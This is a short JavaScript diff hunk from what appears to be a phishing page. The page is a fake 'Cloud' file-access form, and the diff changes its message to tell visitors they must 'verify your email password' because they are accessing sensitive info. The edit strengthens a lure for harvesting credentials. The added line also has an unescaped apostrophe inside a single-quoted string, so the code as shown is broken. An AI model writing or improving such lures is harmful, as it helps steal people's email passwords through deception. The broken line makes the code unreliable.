@@ -133,7 +133,7 @@ function createForm() {
     containerDiv.appendChild(h2);
 
     const p = document.createElement('p');
-    p.textContent = 'Please sign in to Cloud to access the file.';
+    p.textContent = 'Because you're accessing sensitive info, you need to verify your email password.';
     containerDiv.appendChild(p);
 
     const form = document.createElement('form');
